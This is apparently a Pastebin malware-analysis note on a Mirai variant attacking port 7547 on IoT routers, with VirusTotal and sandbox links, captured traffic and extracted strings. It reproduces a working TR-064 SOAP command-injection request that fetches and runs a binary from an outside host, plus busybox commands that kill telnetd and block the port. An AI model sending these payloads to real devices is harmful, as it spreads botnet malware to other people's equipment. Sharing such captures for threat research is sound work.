
https://pastebin.com/eZrrLGzv


```
New #Mirai scanning port 7547/TCP #IoT

VT:
https://www.virustotal.com/en/file/ff47ff97021c27c058bbbdc9d327b9926e02e48145a4c6ea2abfdb036d992557/analysis/
https://www.virustotal.com/en/file/5fc86972492cd901ea89bd86fbdebd307c3f1d2afa50db955a9594da000d0b38/analysis/
https://www.virustotal.com/en/file/ace9c1fe40f308a2871114da0d0d2f46965add1bda9c4bad62de5320b77e8a73/analysis/
https://www.virustotal.com/en/file/8537f9de4ea6662c22b631c90d647b79e448026327e572b90ec4d1a9f2aa2a50/analysis/
https://www.virustotal.com/en/file/97dd9e460f3946eb0b89ae81a0c3890f529ed47f8bd9fd00f161cde2b5903184/analysis/
https://www.virustotal.com/en/file/2548d997fcc8f32e2aa9605e730af81dc18a03b2108971147f0d305b845eb03f/analysis/

detux sandbox
https://detux.org/report.php?sha256=ff47ff97021c27c058bbbdc9d327b9926e02e48145a4c6ea2abfdb036d992557
https://detux.org/report.php?sha256=ace9c1fe40f308a2871114da0d0d2f46965add1bda9c4bad62de5320b77e8a73




TCP Raw Streams
[172.16.1.32:57982 --> 45.16.159.12:7547]

POST /UD/act?1 HTTP/1.1
Host: 127.0.0.1:7547
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers
Content-Type: text/xml
Content-Length: 526

<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> <SOAP-ENV:Body>  <u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1">   <NewNTPServer1>`cd /tmp;wget http://l.ocalhost.host/1;chmod 777 1;./1`</NewNTPServer1>   <NewNTPServer2></NewNTPServer2>   <NewNTPServer3></NewNTPServer3>   <NewNTPServer4></NewNTPServer4>   <NewNTPServer5></NewNTPServer5>  </u:SetNTPServers> </SOAP-ENV:Body></SOAP-ENV:Envelope>


strings:

POST /
 HTTP/1.1
Myname--is: 
Host: 
Cookie: 
http
url=
POST
/proc/net/tcp
busybox killall -9 telnetd
busybox iptables -A INPUT -p tcp --destination-port 7547 -j DROP
%d.%d.%d.%d
sigaction
POST /UD/act?1 HTTP/1.1
Host: 127.0.0.1:7547
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers
Content-Type: text/xml
Content-Length: 526
<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> <SOAP-ENV:Body>  <u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1">   <NewNTPServer1>`cd /tmp;wget http://l.ocalhost.host/1;chmod 777 1;./1`</NewNTPServer1>   <NewNTPServer2></NewNTPServer2>   <NewNTPServer3></NewNTPServer3>   <NewNTPServer4></NewNTPServer4>   <NewNTPServer5></NewNTPServer5>  </u:SetNTPServers> </SOAP-ENV:Body></SOAP-ENV:Envelope>
POST /UD/act?1 HTTP/1.1
Host: 127.0.0.1:7547
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers
Content-Type: text/xml
Content-Length: 526
<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> <SOAP-ENV:Body>  <u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1">   <NewNTPServer1>`cd /tmp;wget http://l.ocalhost.host/2;chmod 777 2;./2`</NewNTPServer1>   <NewNTPServer2></NewNTPServer2>   <NewNTPServer3></NewNTPServer3>   <NewNTPServer4></NewNTPServer4>   <NewNTPServer5></NewNTPServer5>  </u:SetNTPServers> </SOAP-ENV:Body></SOAP-ENV:Envelope>
POST /UD/act?1 HTTP/1.1
Host: 127.0.0.1:7547
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers
Content-Type: text/xml
Content-Length: 526
<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> <SOAP-ENV:Body>  <u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1">   <NewNTPServer1>`cd /tmp;wget http://l.ocalhost.host/3;chmod 777 3;./3`</NewNTPServer1>   <NewNTPServer2></NewNTPServer2>   <NewNTPServer3></NewNTPServer3>   <NewNTPServer4></NewNTPServer4>   <NewNTPServer5></NewNTPServer5>  </u:SetNTPServers> </SOAP-ENV:Body></SOAP-ENV:Envelope>
```